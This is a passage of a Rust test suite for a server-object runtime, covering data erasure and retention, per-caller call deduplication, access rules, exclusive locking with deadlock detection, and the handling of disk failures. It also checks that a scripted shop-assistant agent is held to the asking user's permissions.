        self.0.load(key)
    }
    fn save(&mut self, key: &str, value: &str) -> Result<(), String> {
        self.0.save(key, value)
    }
    fn keys(&mut self, prefix: &str) -> Result<Vec<String>, String> {
        self.0.keys(prefix)
    }
    fn forget(&mut self, key: &str) -> Result<(), String> {
        self.1.borrow_mut().push(key.to_string());
        Ok(())
    }
}

/// A store with one record that cannot be read until it is written again: because its key
/// was destroyed (an erasure that could not finish, or a copy restored from a backup) when
/// the flag says so, or because the disk fails.
#[derive(Clone, Default)]
struct Spoiled(Shared, Rc<RefCell<Option<String>>>, Rc<std::cell::Cell<bool>>);

impl Store for Spoiled {
    fn load(&mut self, key: &str) -> Result<Option<String>, String> {
        if self.1.borrow().as_deref() == Some(key) {
            return Err("cannot decrypt the record".into());
        }
        self.0.load(key)
    }
    fn save(&mut self, key: &str, value: &str) -> Result<(), String> {
        if self.1.borrow().as_deref() == Some(key) {
            *self.1.borrow_mut() = None;
        }
        self.0.save(key, value)
    }
    fn keys(&mut self, prefix: &str) -> Result<Vec<String>, String> {
        self.0.keys(prefix)
    }
    fn is_erased(&mut self, key: &str) -> Result<bool, String> {
        Ok(self.2.get() && self.1.borrow().as_deref() == Some(key))
    }
}

#[test]
fn erasing_again_overwrites_a_record_that_cannot_be_read() {
    let store = Spoiled::default();
    let boot = || Runtime::boot(compile(KEPT).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    call_as(&mut boot(), 1000.0, "Account/user:ana", "set", json!(["a@example.com"]), who("user:ana", &[])).unwrap();
    *store.1.borrow_mut() = Some("Account/user:ana".into());
    let mut rt = boot();
    // A disk that fails to read is not an erased record: nothing is destroyed or overwritten.
    assert_eq!(rt.erase_subject("user:ana", None).err().map(|e| e.0), Some(503));
    assert!(store.0 .0.borrow().data["Account/user:ana"].contains("a@example.com"), "kept as it was");
    // A record whose key is gone is overwritten.
    store.2.set(true);
    let e = rt.erase_subject("user:ana", None).unwrap();
    assert_eq!(e.erased, ["Account/user:ana"]);
    assert_eq!(rt.export_subject("user:ana").unwrap()["Account/user:ana"]["email"], json!(""));
}

#[test]
fn erasing_destroys_the_stored_copies_keys_and_holds_wait() {
    let store = Forgetful::default();
    let boot = |now: f64| Runtime::boot(compile(KEPT).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(now, 7) }).unwrap().0;
    let mut rt = boot(0.0);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1000.0, "Invoice/user:ana", "bill", json!([120]), ana()).unwrap();
    call_as(&mut rt, 1000.0, "Account/user:ana", "set", json!(["a@example.com"]), ana()).unwrap();
    rt.erase_subject("user:ana", None).unwrap();
    assert_eq!(*store.1.borrow(), ["Account/user:ana"], "the held invoice keeps its key");

    // When the hold ends, its key goes too, and the audit log may forget the person.
    let out = rt.handle(31.0 * DAY, Input::Tick);
    assert_eq!(*store.1.borrow(), ["Account/user:ana", "Invoice/user:ana"]);
    assert!(out.iter().any(|o| matches!(o, Output::Erased { reason, forget: true, .. } if reason == "erase after hold")), "{out:?}");

    // Retention of an active person's old data destroys that object's key, but does not make
    // the audit log forget them.
    call_as(&mut rt, 32.0 * DAY, "Visit/user:bo", "set", json!(["Taif"]), who("user:bo", &[])).unwrap();
    let out = rt.handle(33.5 * DAY, Input::Tick);
    assert!(out.iter().any(|o| matches!(o, Output::Erased { reason, forget: false, .. } if reason == "retain")), "{out:?}");
    assert!(store.1.borrow().contains(&"Visit/user:bo".to_string()));

    // Reading an erased object writes nothing, and starts no clock.
    let before = store.0 .0.borrow().data["Account/user:ana"].clone();
    let mut rt = boot(34.0 * DAY);
    state(&mut rt, 34.0 * DAY, "Account/user:ana");
    assert_eq!(store.0 .0.borrow().data["Account/user:ana"], before);
}

#[test]
fn erasing_a_person_reaches_shared_objects() {
    let store = Shared::default();
    let mut rt = kept(&store, 0.0);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1000.0, "Board/main", "later", json!([]), ana()).unwrap();
    // A call made once keeps a keyed hash of the caller, not the id, and still matches repeats.
    let add = |reply: u64| Input::Call { object: "Account/user:ana".into(), method: "set".into(), args: vec![json!("a@example.com")], reply: Some(reply), call: Some("c-1".into()), caller: ana() };
    rt.handle(1000.0, add(1));
    assert!(replies(&rt.handle(2000.0, add(2)))[0].3.is_none(), "a repeat gets the first result");
    let record = store.0.borrow().data["Account/user:ana"].clone();
    assert!(record.contains("\"calls\"") && !record.contains("user:ana"), "{record}");

    rt.erase_subject("user:ana", None).unwrap();
    let board = store.0.borrow().data["Board/main"].clone();
    assert!(!board.contains("user:ana") && board.contains("\"alarms\":[]"), "the person's alarm on a shared object is gone: {board}");
    rt.handle(6.0 * DAY, Input::Tick);
    assert_eq!(state(&mut rt, 6.0 * DAY, "Board/main")["pings"], json!(0));

    // Call records are kept 72 hours; after that a repeat runs again.
    let mut rt = kept(&store, 0.0);
    rt.handle(10.0 * DAY, add(3));
    let calls = |s: &Shared| s.0.borrow().data["Account/user:ana"].matches("\"id\":\"c-1\"").count();
    assert_eq!(calls(&store), 1);
    rt.handle(14.0 * DAY, Input::Call { object: "Account/user:ana".into(), method: "set".into(), args: vec![json!("b@example.com")], reply: Some(4), call: Some("c-2".into()), caller: ana() });
    assert_eq!(calls(&store), 0, "the old record aged out");
}

#[test]
fn a_call_id_belongs_to_one_caller_and_one_call() {
    let mut rt = server(GUARDED, false);
    let add = |caller: Option<Caller>, text: &str, reply: u64| Input::Call { object: "Board/main".into(), method: "add".into(), args: vec![json!(text)], reply: Some(reply), call: Some("c-1".into()), caller };
    let status = |out: Vec<Output>| out.into_iter().find_map(|o| if let Output::Reply { status, error, .. } = o { Some((status, error)) } else { None }).unwrap();
    assert_eq!(status(rt.handle(1.0, add(who("user:ana", &[]), "a", 1))), (None, None));
    assert_eq!(status(rt.handle(2.0, add(who("user:ana", &[]), "a", 2))), (None, None), "a true repeat gets the first result");
    assert_eq!(status(rt.handle(3.0, add(who("user:bo", &[]), "a", 3))).0, Some(422), "another caller never gets the stored result");
    assert_eq!(status(rt.handle(4.0, add(who("user:ana", &[]), "b", 4))).0, Some(422), "nor do other arguments");
    assert_eq!(state(&mut rt, 5.0, "Board/main")["notes"], json!(["a"]));
    // A refused call is not recorded: the id stays free.
    let clear = Input::Call { object: "Board/main".into(), method: "clear".into(), args: vec![], reply: Some(6), call: Some("c-2".into()), caller: who("", &[]) };
    assert_eq!(status(rt.handle(6.0, clear)).0, Some(403));
    assert_eq!(status(rt.handle(7.0, Input::Call { object: "Board/main".into(), method: "clear".into(), args: vec![], reply: Some(7), call: Some("c-2".into()), caller: who("key:sync", &["staff"]) })), (None, None));
}

#[test]
fn remote_requests_cannot_load_unlimited_objects() {
    let program = compile(GUARDED).unwrap();
    let opts = Options { server: true, render: false, max_objects: 2, ..Options::new(0.0, 7) };
    let mut rt = Runtime::boot(program, Box::new(Shared::default()), opts).unwrap().0;
    let anon = || who("", &[]);
    assert!(call_as(&mut rt, 1.0, "Board/a", "add", json!(["x"]), anon()).is_ok());
    assert!(call_as(&mut rt, 1.0, "Board/b", "add", json!(["x"]), anon()).is_ok());
    assert_eq!(call_as(&mut rt, 1.0, "Board/c", "add", json!(["x"]), anon()).unwrap_err().0, Some(503));
    assert!(call_as(&mut rt, 1.0, "Board/a", "add", json!(["y"]), anon()).is_ok(), "loaded objects stay reachable");
}

#[test]
fn losing_a_role_drops_what_only_that_role_could_read() {
    let (mut device, _) = boot_as(BOARD, Shared::default(), 0.0, false);
    device.handle(0.0, Input::Identity { user: Some("user:ana".into()), roles: vec!["staff".into()] });
    device.handle(1.0, Input::Sync { object: "Board/b".into(), state: json!({ "notes": ["staff only"] }), seq: Some(5) });
    let out = device.handle(2.0, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    assert!(out.iter().any(|o| matches!(o, Output::Subscribe { object, seq: 0 } if object == "Board/b")), "read again under the new roles: {out:?}");
    assert_eq!(state(&mut device, 3.0, "Board/b")["notes"], json!([]));
}

#[test]
fn signing_in_as_someone_else_drops_their_queued_calls_and_replicas() {
    let store = Shared::default();
    let (mut device, _) = boot_as(BOARD, store.clone(), 0.0, false);
    device.handle(0.0, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    device.handle(1.0, Input::Sync { object: "Board/b".into(), state: json!({ "notes": ["ana's"] }), seq: Some(5) });
    let sent = server_calls(&device.handle(2.0, note("from ana")));
    device.handle(3.0, Input::EffectDone { id: sent[0].0, ok: None, error: Some("offline".into()), field: None, unreachable: true });

    let out = device.handle(4.0, Input::Identity { user: Some("user:bo".into()), roles: Vec::new() });
    assert!(out.iter().any(|o| matches!(o, Output::Subscribe { object, seq: 0 } if object == "Board/b")), "replicas start over: {out:?}");
    assert_eq!(state(&mut device, 5.0, "Board/b")["notes"], json!([]), "ana's data is gone");
    assert!(server_calls(&device.handle(9000.0, Input::Tick)).is_empty(), "ana's queued call is never sent as bo");
    assert_eq!(reply(&device.handle(9000.0, Input::Inspect { reply: Some(1) })).unwrap()["outbox"], json!([]));
}

#[test]
fn rule_mistakes_are_compile_errors() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| format!("{} | {}", d.message, d.hint.clone().unwrap_or_default())).collect::<Vec<_>>().join("\n")).unwrap_or_default();
    assert!(msg("@server object A { @allow(\"anyone\") f() {} }").contains("can be called remotely but not read"));
    assert!(msg("@read(\"everyone!\") object A {}").contains("is not a rule word or role"));
    assert!(msg("@read(\"system\") object A {}").contains("reserved"));
    assert!(msg("@read() object A {}").contains("at least one rule word"));
    assert!(msg("@read(\"anyone\") object A { @allow(\"anyone\") private f() {} }").contains("private methods cannot be called remotely"));
    assert!(msg("object A { f() { caller = 1 } }").contains("'caller' cannot be changed"));
    assert!(msg("const caller = 1").contains("'caller' is built in"));
    assert!(msg("object A { f() { invoke(\"A/a\", \"f\", []) } }").contains("is for plugin modules"), "apps cannot act as someone through invoke");
    assert!(msg("object A { @exclusive(\"x\") f() {} }").contains("@exclusive takes no arguments"));
    assert!(msg("object A { @exclusive @exclusive f() {} }").contains("repeated decorator @exclusive"));
    // Personal data.
    assert!(msg("object A { @pii(\"contact\", \"account\") email: string = \"\" }").contains("personal data lives in @server objects"));
    assert!(msg("@server object A { @pii(\"emails\", \"account\") email: string = \"\" }").contains("'emails' is not a personal-data category | use one of: contact"));
    assert!(msg("@server object A { @pii(\"contact\") email: string = \"\" }").contains("say what 'email' is for"));
    assert!(msg("@server object A { @pii(\"contact\", \"for ads\") email: string = \"\" }").contains("say what 'email' is for"));
    assert!(msg("@server object A { @pii(contact, \"x\") email: string = \"\" }").contains("as strings"));
    assert!(msg("@server object A { @pii(\"contact\", \"a\") @pii(\"contact\", \"b\") email: string = \"\" }").contains("repeated field decorator"));
    assert!(msg("@server object A { @every(\"1s\") n: number = 0 }").contains("fields take @pii"));
    // Retention and legal holds.
    assert!(msg("@retain(\"30d\") object A { n: number = 0 }").contains("@retain is for @server objects"));
    assert!(msg("@server @retain(\"soon\") object A { n: number = 0 }").contains("@retain takes a duration"));
    assert!(msg("@server @retain(\"30d\", \"opened\") object A { n: number = 0 }").contains("\"created\" or \"changed\""));
    assert!(msg("@server @legalHold() object A { n: number = 0 }").contains("@legalHold needs one duration"));
}

/// An example app, examples/<name>: app.tj and the other files of its folder, as a bundle.
fn example(name: &str) -> String {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples").join(name);
    let mut files: Vec<(String, String)> = std::fs::read_dir(&dir)
        .unwrap_or_else(|e| panic!("{}: {e}", dir.display()))
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "tj"))
        .map(|p| (p.file_name().unwrap().to_string_lossy().into_owned(), std::fs::read_to_string(&p).unwrap()))
        .collect();
    files.sort_by_key(|(n, _)| (n != "app.tj", n.clone()));
    tj_core::modules::bundle(&files)
}

#[test]
fn the_shop_assistant_acts_within_the_askers_rights() {
    let (mut server, _) = boot_as(&example("durable-cart"), Shared::default(), 0.0, true);
    let plugin = |out: &[Output]| {
        out.iter()
            .find_map(|o| match o {
                Output::Effect { id, effect: Effect::Plugin { plugin, method, args } } => Some((*id, plugin.clone(), method.clone(), args.clone())),
                _ => None,
            })
            .expect("a plugin call")
    };
    let ask = |text: &str, caller: Option<Caller>| Input::Call { object: "Assistant/demo".into(), method: "ask".into(), args: vec![json!(text), json!("ana")], reply: None, call: None, caller };
    let reply = |calls: Json, text: &str| json!({ "text": text, "calls": calls, "stop": if calls.as_array().unwrap().is_empty() { "end_turn" } else { "tool_use" }, "raw": [{ "type": "text", "text": text }] });

    // A shopper asks for tea and a restock: the agent may add tea for them, not restock.
    let (id, name, method, args) = plugin(&server.handle(1.0, ask("a tea, and restock the pots", who("", &[]))));
    assert_eq!((name.as_str(), method.as_str()), ("ai", "complete"));
    assert_eq!(args["messages"], json!([{ "role": "user", "text": "a tea, and restock the pots" }]));
    assert!(args["system"].as_str().unwrap().contains("Green tea") && args["tools"][2]["name"] == "restock");
    let calls = json!([{ "id": "t1", "name": "add", "input": { "sku": "tea", "name": "mallory" } }, { "id": "t2", "name": "restock", "input": { "sku": "pot", "qty": 5 } }]);
    let (id2, _, _, args2) = plugin(&server.handle(2.0, answered(id, reply(calls, ""))));
    let results = &args2["messages"][2]["results"];
    assert_eq!(results[0], json!({ "id": "t1", "output": "done" }));
    assert!(results[1]["output"].as_str().unwrap().starts_with("not allowed") && results[1]["error"] == json!(true), "the rules apply to the agent as to the shopper: {results}");
    server.handle(3.0, answered(id2, reply(json!([]), "Added a tea; only staff may restock.")));

    let cart = state(&mut server, 4.0, "Cart/demo");
    assert_eq!((cart["lines"][0]["sku"].clone(), cart["changedBy"].clone()), (json!("tea"), json!("ana (via the assistant)")), "the name is fixed by the app, not the model");
    assert_eq!(state(&mut server, 4.0, "Shelf/main")["products"][2]["stock"], json!(2));
    let lines = state(&mut server, 4.0, "Assistant/demo")["lines"].clone();
    assert_eq!(lines, json!([{ "who": "ana", "text": "a tea, and restock the pots" }, { "who": "assistant", "text": "Added a tea; only staff may restock." }]));

    // The same request from staff restocks.
    let (id3, _, _, _) = plugin(&server.handle(5.0, ask("restock the pots", who("key:sync", &["staff"]))));
    let restock = json!([{ "id": "t3", "name": "restock", "input": { "sku": "pot", "qty": 5 } }]);
    let (id4, _, _, args4) = plugin(&server.handle(6.0, answered(id3, reply(restock, ""))));
    assert_eq!(args4["messages"].as_array().unwrap().last().unwrap()["results"][0]["output"], json!("done"));
    server.handle(7.0, answered(id4, reply(json!([]), "Restocked.")));
    assert_eq!(state(&mut server, 8.0, "Shelf/main")["products"][2]["stock"], json!(7));

    // A model's arguments are checked like any from outside: text where a number belongs is
    // refused before the method runs.
    let (id5, _, _, _) = plugin(&server.handle(9.0, ask("restock lots of pots", who("key:sync", &["staff"]))));
    let wrong = json!([{ "id": "t5", "name": "restock", "input": { "sku": "pot", "qty": "lots" } }]);
    let (_, _, _, args6) = plugin(&server.handle(10.0, answered(id5, reply(wrong, ""))));
    let result = &args6["messages"].as_array().unwrap().last().unwrap()["results"][0];
    assert!(result["output"].as_str().unwrap().contains("`qty` must be a number") && result["error"] == json!(true), "{result}");
    assert_eq!(state(&mut server, 11.0, "Shelf/main")["products"][2]["stock"], json!(7));
}

const TURNS: &str = r#"
@server object Counter {
  n: number = 0
  log: string[] = []
  @exclusive async bump(tag: string) {
    const v = this.n
    await fetch("https://example.com/" + tag)
    this.n = v + 1
    this.log.push(tag)
  }
  async loose(tag: string) {
    const v = this.n
    await fetch("https://example.com/" + tag)
    this.n = v + 1
  }
  peek() { this.log.push("peek") }
}
"#;

fn fetches(out: &[Output]) -> Vec<u32> {
    out.iter().filter_map(|o| if let Output::Effect { id, effect: Effect::Http { .. } } = o { Some(*id) } else { None }).collect()
}

/// A reply: its id, result, error and status.
type Answer = (u64, Option<Json>, Option<String>, Option<u16>);

fn replies(out: &[Output]) -> Vec<Answer> {
    out.iter().filter_map(|o| if let Output::Reply { reply, ok, error, status, .. } = o { Some((*reply, ok.clone(), error.clone(), *status)) } else { None }).collect()
}

fn trusted_call(object: &str, method: &str, args: Json, reply: u64, call: Option<&str>) -> Input {
    Input::Call { object: object.into(), method: method.into(), args: args.as_array().cloned().unwrap_or_default(), reply: Some(reply), call: call.map(String::from), caller: Some(Caller::trusted()) }
}

const FETCHED: fn() -> Json = || json!({ "status": 200, "headers": {}, "body": "" });

#[test]
fn exclusive_calls_take_turns_and_lose_no_updates() {
    let mut rt = server(TURNS, false);
    let a = fetches(&rt.handle(1.0, trusted_call("Counter/c", "bump", json!(["a"]), 1, None)));
    assert_eq!(a.len(), 1);
    assert!(fetches(&rt.handle(2.0, trusted_call("Counter/c", "bump", json!(["b"]), 2, None))).is_empty(), "b waits for a's turn");
    assert_eq!(rt.stats()["waiting"], json!({ "Counter": 1 }));
    // Methods that are not exclusive never wait.
    assert_eq!(replies(&rt.handle(3.0, trusted_call("Counter/c", "peek", json!([]), 3, None)))[0].0, 3);

    let out = rt.handle(4.0, answered(a[0], FETCHED()));
    assert_eq!(replies(&out).iter().map(|r| r.0).collect::<Vec<_>>(), vec![1], "a answers");
    let b = fetches(&out);
    assert_eq!(b.len(), 1, "then b starts");
    assert_eq!(replies(&rt.handle(5.0, answered(b[0], FETCHED())))[0].0, 2);
    let c = state(&mut rt, 6.0, "Counter/c");
    assert_eq!((c["n"].clone(), c["log"].clone()), (json!(2), json!(["peek", "a", "b"])));
    assert_eq!(rt.stats()["waiting"], json!({}));

    // The same interleaving without @exclusive loses an update.
    let x = fetches(&rt.handle(7.0, trusted_call("Counter/c", "loose", json!(["x"]), 7, None)));
    let y = fetches(&rt.handle(8.0, trusted_call("Counter/c", "loose", json!(["y"]), 8, None)));
    rt.handle(9.0, answered(x[0], FETCHED()));
    rt.handle(10.0, answered(y[0], FETCHED()));
    assert_eq!(state(&mut rt, 11.0, "Counter/c")["n"], json!(3), "4 calls, 3 counted: the race @exclusive prevents");
}

#[test]
fn an_agent_calling_back_into_its_own_object_does_not_wait_for_itself() {
    let src = r#"
import { act, Skill } from "tj:agent"

@server object Desk {
  notes: string[] = []
  @exclusive async ask(q: string) {
    const skills: Skill[] = [{ name: "note", object: "Desk/d", method: "note", description: "Write a note.", params: ["text"], input: { type: "object", properties: { text: { type: "string" } }, required: ["text"] }, fixed: {} }]
    const turn = await act("You keep notes.", [{ role: "user", text: q }], skills, 3)
    this.notes.push("answer: " + turn.text)
  }
  @exclusive note(text: string) { this.notes.push(text) }
}
"#;
    let (mut rt, _) = boot_as(src, Shared::default(), 0.0, true);
    let plugin = |out: &[Output]| out.iter().find_map(|o| if let Output::Effect { id, effect: Effect::Plugin { .. } } = o { Some(*id) } else { None });
    let model = |calls: Json, text: &str| json!({ "text": text, "calls": calls, "stop": if calls.as_array().unwrap().is_empty() { "end_turn" } else { "tool_use" }, "raw": [{ "type": "text", "text": text }] });

    let first = plugin(&rt.handle(1.0, trusted_call("Desk/d", "ask", json!(["one"]), 1, None))).expect("the model is asked");
    assert_eq!(plugin(&rt.handle(1.5, trusted_call("Desk/d", "ask", json!(["two"]), 2, None))), None, "a second question waits its turn");
    // The model asks for a tool that is a method of the same object: it belongs to the
    // asking call's chain, so it enters at once.
    let tool = json!([{ "id": "t1", "name": "note", "input": { "text": "from the agent" } }]);
    let out = rt.handle(2.0, answered(first, model(tool, "")));
    let second = plugin(&out).expect("the tool ran and the model is asked again");
    // A server's audit log hears of each tool the agent ran, as whom (here the trusted host).
    assert!(out.contains(&Output::Ran { object: "Desk/d".into(), method: "note".into(), by: "invoke".into(), caller: None, ok: true, ms: 0 }), "{out:?}");
    let out = rt.handle(3.0, answered(second, model(json!([]), "ok")));
    assert_eq!(replies(&out)[0].0, 1);
    assert!(plugin(&out).is_some(), "then the second question starts");
    assert_eq!(state(&mut rt, 4.0, "Desk/d")["notes"], json!(["from the agent", "answer: ok"]));
}

#[test]
fn calls_that_would_wait_for_each_other_fail_at_once() {
    let src = r#"
@server object X {
  @exclusive async m() {
    await fetch("https://example.com/x")
    Y.get("y").n()
    return "m done"
  }
  @exclusive p() { }
}
@server object Y {
  @exclusive async k() {
    await fetch("https://example.com/y")
    X.get("x").p()
  }
  @exclusive n() { }
}
"#;
    let mut rt = server(src, false);
    let ex = fetches(&rt.handle(1.0, trusted_call("X/x", "m", json!([]), 1, None)));
    let ey = fetches(&rt.handle(2.0, trusted_call("Y/y", "k", json!([]), 2, None)));
    // m holds X and now waits for Y, which k holds.
    assert!(replies(&rt.handle(3.0, answered(ex[0], FETCHED()))).is_empty());
    // k, holding Y, now wants X: a cycle. k fails at once, which frees Y, so m finishes.
    let out = replies(&rt.handle(4.0, answered(ey[0], FETCHED())));
    let k = out.iter().find(|r| r.0 == 2).expect("k answered");
    assert!(k.2.as_deref().unwrap_or("").contains("both would wait forever"), "{k:?}");
    let m = out.iter().find(|r| r.0 == 1).expect("m answered");
    assert_eq!(m.1, Some(json!("m done")));
}

#[test]
fn waits_are_bounded_and_timers_merge() {
    let src = r#"
@server object Slot {
  ticks: number = 0
  done: string[] = []
  @exclusive async hold() { await fetch("https://example.com/hold") }
  @exclusive take(tag: string) { this.done.push(tag) }
  @exclusive @every("1s") beat() { this.ticks += 1 }
}
"#;
    let mut rt = server(src, false);
    let held = fetches(&rt.handle(500.0, trusted_call("Slot/s", "hold", json!([]), 1, None)));
    assert!(replies(&rt.handle(600.0, trusted_call("Slot/s", "take", json!(["late"]), 2, Some("c1")))).is_empty());
    // Beats pile up behind the hold and merge into one.
    for now in [1500.0, 2500.0, 3500.0] {
        rt.handle(now, Input::Tick);
    }
    assert_eq!(rt.stats()["waiting"], json!({ "Slot": 2 }));

    // After 30 s the request gives up with 503; the beat keeps waiting.
    let out = replies(&rt.handle(30_700.0, Input::Tick));
    assert_eq!((out[0].0, out[0].3), (2, Some(503)), "{out:?}");
    assert!(out[0].2.as_deref().unwrap_or("").contains("Slot/s was busy for 30 s"), "{out:?}");
    assert_eq!(rt.stats()["waiting"], json!({ "Slot": 1 }));

    rt.handle(31_000.0, answered(held[0], FETCHED()));
    assert_eq!(state(&mut rt, 31_100.0, "Slot/s")["ticks"], json!(1), "the merged beat ran once");
    // The timed-out call was not recorded, so its retry runs.
    assert_eq!(replies(&rt.handle(31_200.0, trusted_call("Slot/s", "take", json!(["late"]), 3, Some("c1"))))[0].3, None);
    assert_eq!(state(&mut rt, 31_300.0, "Slot/s")["done"], json!(["late"]));

    // At most 100 calls wait per object (a waiting beat takes one place).
    fetches(&rt.handle(32_000.0, trusted_call("Slot/s", "hold", json!([]), 4, None)));
    for i in 0.. {
        let r = replies(&rt.handle(32_001.0, trusted_call("Slot/s", "take", json!([i.to_string()]), 10 + i, None)));
        if let Some(full) = r.first() {
            assert_eq!(full.3, Some(503), "{full:?}");
            break;
        }
        assert!(i < 100, "the queue never filled");
    }
    assert_eq!(rt.stats()["waiting"], json!({ "Slot": 100 }));
}

/// A store whose saves, or reads, or saves of one key, can be made to fail, like a full or
/// broken disk.
#[derive(Clone, Default)]
struct Flaky(Shared, Rc<std::cell::Cell<bool>>, Rc<std::cell::Cell<bool>>, Rc<std::cell::RefCell<String>>);

impl Store for Flaky {
    fn load(&mut self, key: &str) -> Result<Option<String>, String> {
        if self.2.get() {
            return Err("permission denied".into());
        }
        self.0.load(key)
    }
    fn save(&mut self, key: &str, value: &str) -> Result<(), String> {
        if self.1.get() || *self.3.borrow() == key {
            return Err("disk full".into());
        }
        self.0.save(key, value)
    }
    fn keys(&mut self, prefix: &str) -> Result<Vec<String>, String> {
        self.0.keys(prefix)
    }
}

#[test]
fn a_failed_save_fails_the_call_and_changes_nothing() {
    let store = Flaky::default();
    let program = compile(BOARD).unwrap();
    let mut rt = Runtime::boot(program, Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    let add = |text: &str, reply: u64| Input::Call { object: "Board/b".into(), method: "add".into(), args: vec![json!(text)], reply: Some(reply), call: Some("c-1".into()), caller: Some(Caller::trusted()) };
    let answer = |out: Vec<Output>| out.into_iter().find_map(|o| if let Output::Reply { ok, status, .. } = o { Some((ok, status)) } else { None }).unwrap();

    store.1.set(true);
    assert_eq!(answer(rt.handle(1.0, add("one", 1))), (None, Some(503)), "nobody is told it worked");
    assert_eq!(state(&mut rt, 2.0, "Board/b")["notes"], json!([]), "the change is undone in memory too");

    // The disk recovers: the retry with the same call id runs, rather than returning a result
    // that was never saved.
    store.1.set(false);
    assert_eq!(answer(rt.handle(3.0, add("one", 3))), (Some(json!(1)), None));
    assert_eq!(state(&mut rt, 4.0, "Board/b")["notes"], json!(["one"]));
}

#[test]
fn an_alarm_from_a_call_that_could_not_be_saved_never_fires() {
    let store = Flaky::default();
    let mut rt = Runtime::boot(compile(ACCOUNTS).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    let ana = || who("user:ana", &[]);
    store.1.set(true);
    assert_eq!(call_as(&mut rt, 1.0, "Account/user:ana", "set", json!(["a@example.com", ""]), ana()).unwrap_err().0, Some(503));
    store.1.set(false);
    rt.handle(61_000.0, Input::Tick);
    assert_eq!(state(&mut rt, 62_000.0, "Account/user:ana")["plan"], json!("free"), "the call failed, so its alarm is gone too");

    // The alarm index is saved before the object, so a restart always finds the object's
    // alarms; when the index cannot be saved, the call fails rather than claim it worked.
    *store.3.borrow_mut() = "tj:alarms".into();
    let refused = call_as(&mut rt, 70_000.0, "Account/user:bo", "set", json!(["b@example.com", ""]), who("user:bo", &[]));
    assert_eq!(refused.unwrap_err().0, Some(503));
    assert!(!store.0.0.borrow().data.contains_key("Account/user:bo"), "and nothing was saved");
    store.3.borrow_mut().clear();
    call_as(&mut rt, 71_000.0, "Account/user:bo", "set", json!(["b@example.com", ""]), who("user:bo", &[])).unwrap();
    let mut restarted = Runtime::boot(compile(ACCOUNTS).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(72_000.0, 7) }).unwrap().0;
    restarted.handle(132_000.0, Input::Tick);
    assert_eq!(restarted.export_subject("user:bo").unwrap()["Account/user:bo"]["plan"], json!("reminded"), "found and run after a restart");
}

#[test]
fn a_damaged_alarm_index_stops_the_boot() {
    let store = Shared::default();
    store.0.borrow_mut().data.insert("tj:alarms".into(), "{not json".into());
    let err = Runtime::boot(compile(ACCOUNTS).unwrap(), Box::new(store), Options { server: true, render: false, ..Options::new(0.0, 7) }).err().unwrap();
    assert!(err.message.contains("tj:alarms is damaged"), "{}", err.message);
}

#[test]
fn a_record_that_cannot_be_read_fails_the_call_and_is_not_overwritten() {
    let store = Flaky::default();
    let boot = || Runtime::boot(compile(BOARD).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    let add = |text: &str| Input::Call { object: "Board/b".into(), method: "add".into(), args: vec![json!(text)], reply: Some(1), call: None, caller: Some(Caller::trusted()) };
    boot().handle(1.0, add("kept"));

    // After a restart the disk cannot be read: the object must not start empty, or its
    // next save would replace what is stored.
    let mut rt = boot();
    store.2.set(true);
    let out = rt.handle(2.0, add("lost"));
    assert!(out.iter().any(|o| matches!(o, Output::Reply { status: Some(503), error: Some(e), .. } if e.contains("could not be read"))), "{out:?}");
    store.2.set(false);
    rt.handle(3.0, add("next"));
    assert_eq!(state(&mut rt, 4.0, "Board/b")["notes"], json!(["kept", "next"]));
}

#[test]
fn every_example_compiles() {
    let examples = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples");
    let mut checked = 0;
    for entry in std::fs::read_dir(examples).unwrap() {
        let name = entry.unwrap().file_name().to_string_lossy().into_owned();
        let src = example(&name);
        if let Err(errs) = compile(&src) {
            panic!("{}", errs.iter().map(|e| e.render(&format!("examples/{name}/app.tj"), &src)).collect::<Vec<_>>().join("
"));
        }
        checked += 1;
    }
    assert!(checked >= 4, "found {checked} examples");
}

fn state(rt: &mut Runtime, now: f64, object: &str) -> Json {
    reply(&rt.handle(now, Input::Get { object: object.into(), reply: Some(1), caller: Some(Caller::trusted()) })).unwrap()
}

#[test]
fn durable_cart_holds_stock_and_the_backend_releases_it() {
    let (mut server, _) = boot_as(&example("durable-cart"), Shared::default(), 0.0, true);
    for _ in 0..2 {
        call(&mut server, 1.0, "Cart/demo", "add", json!(["pot", "ana"])).unwrap();
    }
    assert!(call(&mut server, 2.0, "Cart/demo", "add", json!(["pot", "ana"])).unwrap_err().contains("out of stock"));
    let cart = state(&mut server, 2.0, "Cart/demo");
    assert_eq!((cart["total"].clone(), cart["changedBy"].clone()), (json!(96), json!("ana")));

    // Left alone, the hold expires on the backend and the stock goes back on the shelf.
    server.handle(11.0 * 60_000.0, Input::Tick);
    let cart = state(&mut server, 11.0 * 60_000.0, "Cart/demo");
    assert_eq!((cart["status"].clone(), cart["lines"].clone(), cart["changedBy"].clone()), (json!("released"), json!([]), json!("backend")));
    let shelf = state(&mut server, 11.0 * 60_000.0, "Shelf/main");
    assert!(shelf["products"][2]["stock"].as_f64().unwrap() >= 2.0, "held pots returned: {shelf}");

    // A released cart takes no changes until it starts over; checking out reports the total.
    assert!(call(&mut server, 700_000.0, "Cart/demo", "add", json!(["tea", "bo"])).unwrap_err().contains("released"));
    call(&mut server, 700_000.0, "Cart/demo", "startOver", json!(["bo"])).unwrap();
    call(&mut server, 700_001.0, "Cart/demo", "add", json!(["tea", "bo"])).unwrap();
    let out = server.handle(700_002.0, Input::Call { object: "Cart/demo".into(), method: "checkout".into(), args: vec![json!("bo")], reply: Some(1), call: None, caller: Some(Caller::trusted()) });
    assert_eq!(reply(&out).unwrap(), json!(4.5));
